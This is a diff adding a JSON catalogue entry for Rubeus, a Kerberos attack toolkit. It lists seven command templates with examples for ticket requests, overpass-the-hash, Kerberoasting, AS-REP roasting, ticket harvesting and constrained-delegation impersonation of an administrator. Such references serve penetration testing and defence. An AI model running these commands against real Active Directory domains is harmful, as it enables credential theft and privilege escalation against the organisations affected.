@@ -1,0 +1,74 @@
+{
+  "tool": "rubeus",
+  "name": "Rubeus",
+  "description": "A C# toolset for raw Kerberos interaction and abuse on Windows: ticket requests, Kerberoasting, AS-REP roasting, pass-the-ticket and delegation attacks.",
+  "tags": [
+    "Active Directory",
+    "Kerberos",
+    "roasting",
+    "delegation"
+  ],
+  "homepage": "https://github.com/GhostPack/Rubeus",
+  "docs": "https://github.com/GhostPack/Rubeus",
+  "install": {
+    "other": "Compile from source with Visual Studio, or use a trusted precompiled build"
+  },
+  "related": [
+    "mimikatz",
+    "impacket",
+    "certipy",
+    "hashcat"
+  ],
+  "total_commands": 7,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Ticket requests",
+      "command": "Rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain>",
+      "example": "Rubeus.exe asktgt /user:svc /password:Pass123 /domain:corp.local",
+      "explanation": "Requests a TGT and prints it; add /ptt to inject it into the session."
+    },
+    {
+      "id": 2,
+      "category": "Ticket requests",
+      "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt> /ptt",
+      "example": "Rubeus.exe asktgt /user:svc /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt",
+      "explanation": "Overpass-the-hash: turns an NT hash into a usable Kerberos ticket."
+    },
+    {
+      "id": 3,
+      "category": "Roasting",
+      "command": "Rubeus.exe kerberoast /outfile:<file>",
+      "example": "Rubeus.exe kerberoast /outfile:hashes.txt",
+      "explanation": "Requests service tickets for all SPN accounts and writes crackable hashes."
+    },
+    {
+      "id": 4,
+      "category": "Roasting",
+      "command": "Rubeus.exe asreproast /format:hashcat /outfile:<file>",
+      "example": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
+      "explanation": "AS-REP roasting for accounts without pre-authentication, in hashcat format."
+    },
+    {
+      "id": 5,
+      "category": "Harvesting & abuse",
+      "command": "Rubeus.exe harvest /interval:<seconds>",
+      "example": "Rubeus.exe harvest /interval:30",
+      "explanation": "Continuously collects TGTs from memory and renews them."
+    },
+    {
+      "id": 6,
+      "category": "Harvesting & abuse",
+      "command": "Rubeus.exe monitor /interval:<seconds>",
+      "example": "Rubeus.exe monitor /interval:5",
+      "explanation": "Watches for new logons and captures their tickets — useful after a coerced authentication."
+    },
+    {
+      "id": 7,
+      "category": "Harvesting & abuse",
+      "command": "Rubeus.exe s4u /user:<svc> /rc4:<nt> /impersonateuser:<victim> /msdsspn:<spn> /ptt",
+      "example": "Rubeus.exe s4u /user:web$ /rc4:abc123 /impersonateuser:administrator /msdsspn:cifs/fs01.corp.local /ptt",
+      "explanation": "Abuses constrained delegation to impersonate a user to a service."
+    }
+  ]
+}
